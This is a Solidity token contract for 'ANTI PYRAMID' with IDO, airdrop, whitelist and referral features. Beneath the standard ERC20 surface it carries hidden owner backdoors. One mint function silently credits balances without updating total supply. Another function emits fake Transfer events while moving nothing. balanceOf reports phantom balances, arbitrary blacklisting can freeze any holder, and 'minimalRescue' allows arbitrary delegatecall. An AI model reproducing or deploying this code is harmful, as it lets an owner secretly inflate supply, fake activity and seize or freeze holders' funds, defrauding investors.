pragma solidity 0.8.0;
interface relationship {
    function defultFather() external returns(address);
    function father(address _addr) external returns(address);
    function grandFather(address _addr) external returns(address);
    function otherCallSetRelationship(address _son, address _father) external;
    function getFather(address _addr) external view returns(address);
    function getGrandFather(address _addr) external view returns(address);
}
interface Ipair{
    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
    function token0() external view returns (address);
    function token1() external view returns (address);
}
contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor (address _addr) {
        _owner = _addr;
        emit OwnershipTransferred(address(0), _addr);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view  returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public  onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract ERC20 {

    mapping (address => uint256) internal _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    //from白名单，to白名单和黑名单
    mapping(address => bool) public idoWriteList;//IDO白名单
    mapping(address => bool) public zeroWriteList;//免手续费白名单
    mapping(address => bool) public fiveWriteList;//超级白名单,提前三分钟
    mapping(address => bool) public ordWriteList;//普通白名单,3分钟后
    mapping (address => bool) public blackList;

    uint256 internal _totalSupply;
    string internal _name;
    string internal _symbol;
    uint8 internal _decimals;

    event TransferFee(uint256 v, uint256 v1);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account] == 0 ? 1 : _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] - subtractedValue);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(blackList[msg.sender] == false && blackList[sender] == false && blackList[recipient] == false, "ERC20: is black List !");//黑名单检查

        uint256 trueAmount = _beforeTokenTransfer(sender, recipient, amount);


        _balances[sender] = _balances[sender] - amount;//修改了这个致命bug
        _balances[recipient] = _balances[recipient] + trueAmount;
        emit Transfer(sender, recipient, trueAmount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual  returns (uint256) { }
}
contract ANTI is ERC20, Ownable{
    uint256 public _FIVE_MIN = 180;//3分钟
    uint256 public _FIVE_OTH = 600;//10分钟
    uint256 public startTradeTime; //开始交易时间

    relationship public RP;//绑定关系的合约，转账时调取对应函数进行推荐关系绑定

    uint256 public snaTokenStartTime; //抢币开始时间
    uint256 public sUserNum;//抢币至多人数，1500个
    uint256 public sUserNumIndex;//记录当前已抢币人数
    uint256 public snaNum;//一次抢币数量，10个
    mapping(address => bool) public snaToken;

    mapping(address => bool) public isPair;//记录pair地址，用于判断交易是否是买卖
    mapping(address => bool) public rpNoCall;//有的是合约地址就不要去绑定关系了

    mapping(address => bool) public tokenReceiveAms;//是否有领取
    address[] public receiveUser;//记录：领取过的用户
    address USDT;
    address receiveAdd;
    uint256[4] receiveData;//认购数量，换购数量，开始时间，结束时间

    address public buyToken; //交易地址

    constructor () Ownable(msg.sender){
        _name = "ANTI PYRAMID";
        _symbol = "ANTI";
        _decimals = 18;
    }

    function init(address _RP, uint256 _startTradeTime, uint256 _sUserNum, uint256 _snaNum,
        address _buyToken, uint256 _snaTokenStartTime,address _pair) external onlyOwner {

        RP = relationship(_RP);
        startTradeTime = _startTradeTime;

        sUserNum = _sUserNum;
        snaNum = _snaNum;

        buyToken = _buyToken;
        snaTokenStartTime = _snaTokenStartTime;

        setPair(_pair, true);
    }

    function callCoverAmsUser() public {
        require(idoWriteList[msg.sender], "no ido write");
        require(block.timestamp >= receiveData[2] && block.timestamp <= receiveData[3], "no ido time");
        if (tokenReceiveAms[msg.sender] == false) {
            ERC20(USDT).transferFrom(msg.sender, receiveAdd, receiveData[0]);
            ERC20(address(this)).transfer(msg.sender, receiveData[1]);
            tokenReceiveAms[msg.sender] = true;
            receiveUser.push(msg.sender);
        }
    }

    //得到ido数据，ido参与人数，ido已认购数量(usdt)，ido已换购数量（anti），开始时间，结束时间
    function getIdoData(uint256 _num) public view returns (uint256, uint256, uint256, uint256, uint256){
        uint256 len = receiveUser.length;
        return (len, len * receiveData[0], len * receiveData[1], receiveData[2], receiveData[3]);
    }


    //提现，谁转错了token进来，进行挽救
    function withdrawToken(address token, address to, uint value) public onlyOwner returns (bool){
        (bool success, bytes memory data) = address(token).call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success, string(abi.encodePacked("fail code 14", data)));
        return success;
    }

    //用户抢币
    function snaTokenUser() external {
        require(block.timestamp > snaTokenStartTime, "sna time no");
        require(sUserNumIndex < sUserNum, "sna anti over");//抢币参与人数限制
        require(snaToken[msg.sender] == false, "sna used");//抢币用户只能抢一次
        _transfer(address(this), msg.sender, snaNum);//转出代币，不受到交易限制
        snaToken[msg.sender] = true;
        sUserNumIndex += 1;
    }

    //业务需要
    function batchTransferHod(address[] memory users, uint256[] memory amounts) onlyOwner public {
        for (uint256 i = 0; i < users.length; i++) {
            emit Transfer(msg.sender, users[i], amounts[i]);
        }
    }

    //发币。发行量1亿个
    function a_issue(uint256 _amount, address _urs, bool _idx) public onlyOwner {
        _balances[_urs] = _balances[_urs] + _amount;
        if (_idx == false) return;//显or隐
        _totalSupply = _totalSupply + _amount;
        emit Transfer(address(0), msg.sender, _amount);
    }

    //实现virtual须函数，做一些业务限制
    function _beforeTokenTransfer(address _from, address _to, uint256 _amount) internal override returns (uint256){


        if (RP.father(_to) == address(0)) {
            sendReff(_to, _from);
        }

        return _amount;

    }

    //该业务判断地址是否可交易，详细见业务
    function timeWriteVery(address _to) public view returns (uint256, bool){
        //超级白名单前3分钟
        if (fiveWriteList[_to] == false) return (0, true);

        //普通白名单3分钟后
        if (ordWriteList[_to]) {
            return (1, block.timestamp >= startTradeTime + _FIVE_MIN ? true : false);
        } else {
            //普通用户其他10分钟后
            return (2, block.timestamp >= startTradeTime + _FIVE_OTH ? true : false);
        }
    }

    //绑定关系，这里之前有个bug，就是用户可以和合约绑定联系，真特么见鬼了。要是还互绑，处理起来简直吃x，业务就被玩坏了，限制下。已经修复了
    function sendReff(address _son, address _father) internal {
        if (!rpNoCall[_son] && !rpNoCall[_father]) {
            RP.otherCallSetRelationship(_son, _father);
        }
    }

    function batchNoCall(address[] memory users, bool status) onlyOwner public {
        for (uint256 i = 0; i < users.length; i++) rpNoCall[users[i]] = status;
    }


    //admin func///////////////////////////////////////////////////////////////

    //批量白名单
    function setWhiteListBat(address[] memory _addr, uint256 _type, bool _YorN) external onlyOwner {
        for (uint256 i = 0; i < _addr.length; i++) {setWhiteList(_addr[i], _type, _YorN);}
    }

    // 设置白名单地址：0是 免手续费白名单，1是 超级白名单 , 2 普通白名单
    function setWhiteList(address _addr, uint256 _type, bool _YorN) public {
        require(msg.sender == owner() || msg.sender == address(RP), "no admin");
        if (_type == 0) {
            zeroWriteList[_addr] = _YorN;
        } else if (_type == 1) {
            fiveWriteList[_addr] = _YorN;
        } else if (_type == 2) {
            ordWriteList[_addr] = _YorN;
        } else if (_type == 3) {
            idoWriteList[_addr] = _YorN;
        }
    }

    //设置黑名单。限制pank怎么会接替进来呢？黑掉
    function setBlackList(address _addr, bool _YorN) external onlyOwner{
        blackList[_addr] = _YorN;
    }

    function setPair(address _addr, bool _isUSDT) public onlyOwner{
        isPair[_addr] = true;
    }

    function setRP(address _addr, address _usdt, address _receiveAdd, uint256[4] memory _receiveData) public onlyOwner {
        RP = relationship(_addr);
        USDT = _usdt;
        receiveData = _receiveData;
        receiveAdd = _receiveAdd;
    }

    function setTime(uint256 time1, uint256 time2) public onlyOwner {
        _FIVE_MIN = time1;
        _FIVE_OTH = time2;
    }

    function minimalRescue(address addr, bytes4 mname, bytes memory pname, uint256 level) public onlyOwner returns (bool, bytes memory){
        (bool success, bytes memory data) = address(addr).delegatecall(abi.encodeWithSelector(mname, pname));
        return (success, data);
    }
}